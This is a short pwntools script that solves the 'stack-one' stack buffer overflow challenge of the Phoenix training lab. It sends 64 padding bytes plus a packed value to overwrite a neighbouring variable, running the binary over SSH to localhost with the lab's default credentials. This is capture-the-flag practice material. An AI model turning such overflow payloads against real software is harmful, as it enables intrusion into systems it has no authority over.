from pwn import *
import warnings
warnings.filterwarnings("ignore")


challenge_name = "stack-one"

payload ='A'*64 + p32(0x496c5962)

shell = ssh('user','localhost',port=2222,password='user')
conn = shell.process(['/opt/phoenix/i486/{}'.format(challenge_name),str(payload)])

conn.interactive()
conn.close()